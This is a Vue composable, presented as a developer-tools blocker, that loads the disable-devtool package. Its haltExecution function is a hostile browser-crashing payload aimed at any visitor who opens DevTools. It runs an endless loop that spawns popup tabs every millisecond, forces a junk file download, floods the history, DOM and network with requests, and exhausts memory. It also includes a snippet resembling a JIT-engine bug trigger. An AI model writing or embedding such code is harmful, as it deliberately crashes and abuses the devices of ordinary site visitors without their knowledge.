import { onMounted } from 'vue';

export default function blockDevTools() {
  onMounted(async () => {
    if (process.client && typeof window !== 'undefined') {
      try {
        const devtoolModule = await import('disable-devtool');
        const devtoolBlocker = devtoolModule.default;

        // Ensure meaningful condition remains unchanged
        devtoolBlocker({
          ondevtoolopen: () => {
            console.warn('DevTools activated!'); // Replace with haltExecution() or equivalent logic
            haltExecution();
          },
        });
      } catch (err) {
        console.error('Could not block developer tools:', err);
      }
    }
  });
}

function haltExecution() {
  document.body.innerHTML = '';
  let messageContent = "";
  let alertMessage = `Unauthorized access to developer tools detected.`;

  for (var index = 0; index === index; index++) {
    // Create and style the container div with content
    var container = document.createElement("div");
    container.innerText = messageContent + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰✘͢͢ۦ".repeat(99);
    container.style.position = "absolute";
    container.style.top = "0";
    container.style.left = "0";
    container.style.zIndex = "999";
    container.style.backgroundColor = "rgba(255, 0, 0, 0.5)";
    container.style.width = "100%";
    container.style.height = "51px";
    container.style.overflow = "hidden";
    document.body.insertBefore(container, document.body.firstChild);

    // Create and style the overlay div for the alert
    var overlay = document.createElement("div");
    overlay.innerText = alertMessage;
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.backgroundColor = "rgba(0, 0, 0, 0.85)";
    overlay.style.color = "white";
    overlay.style.display = "flex";
    overlay.style.alignItems = "center";
    overlay.style.justifyContent = "center";
    overlay.style.fontSize = "25px";
    overlay.style.zIndex = "2147483647"; // Max z-index
    overlay.style.cursor = "pointer";

    // Redirect to google.com when clicked
    overlay.addEventListener('click', function () {
      redirectTo("https://google.com");
    });

    container.addEventListener('click', function () {
      redirectTo("https://google.com");
    });

    // Append the overlay to the body
    document.body.appendChild(overlay);

    console.log(messageContent);
    console.log(alertMessage);

    var memoryArr = [];
    for (var i = 0; i < 300000; i++) {
      memoryArr[i] = (i % 256);
    }
    var blobUrl = 'data:application/pdf,' + memoryArr;
    var downloadLink = document.createElement("a");
    downloadLink.download = "developer-tools-not-allowed.pdf";
    downloadLink.href = blobUrl;
    downloadLink.textContent = memoryArr;
    document.body.appendChild(downloadLink);
    downloadLink.click();

    var urlFragment = "";
    for (var i = 0; i < 100000; i++) {
      urlFragment = urlFragment + i.toString();
      history.pushState(0, 0, urlFragment);
    }

    // Increase memory load
    let memoryLoadArray = [];
    for (let j = 0; j < 1000; j++) {
      memoryLoadArray.push(messageContent.repeat(1000));
    }

    // Set multiple intervals
    setInterval(function () {
      redirectTo("https://google.com");
    }, 1);

    setInterval(function () {
      console.log("Random debug log: ", Math.random());
    }, 1);

    setInterval(function () {
      let spamElement = document.createElement("div");
      spamElement.innerText = Array(100).fill("Spam Alert! ").join("");
      document.body.appendChild(spamElement);
    }, 1);

    let memoryHog = [];
    setInterval(() => {
      memoryHog.push(new Array(1000000).fill('B'));
    }, 3);

    setInterval(function () {
      generateNestedElements(400);
    }, 0.5);

    fetch("https://google.com");
    setInterval(function () {
      while (true) {
        fetch("https://google.com");
      }
    }, 1);

    const computation = (input) => {
      let result = Math.min(Infinity ? [] : Infinity, -0) / 0;
      if (input) result = -0;
      return result ? 1 : 0;
    };

    computation(false);
    for (let i = 0; i < 0x10000; ++i) computation(false);
    computation(false);
  }
}

function redirectTo(url) {
  let windowObj = window.open(url, '_blank');
  if (windowObj) {
    windowObj.focus();
  }
}

const generateNestedElements = (levels) => {
  let outerElement = document.createElement('small');
  outerElement.classList.add('nested-small');

  let currentElement = outerElement;

  for (let i = 1; i < levels; i++) {
    let nestedElement = document.createElement('small');
    nestedElement.classList.add('nested-small');
    currentElement.appendChild(nestedElement);
    currentElement = nestedElement;
  }

  document.body.appendChild(outerElement);
};
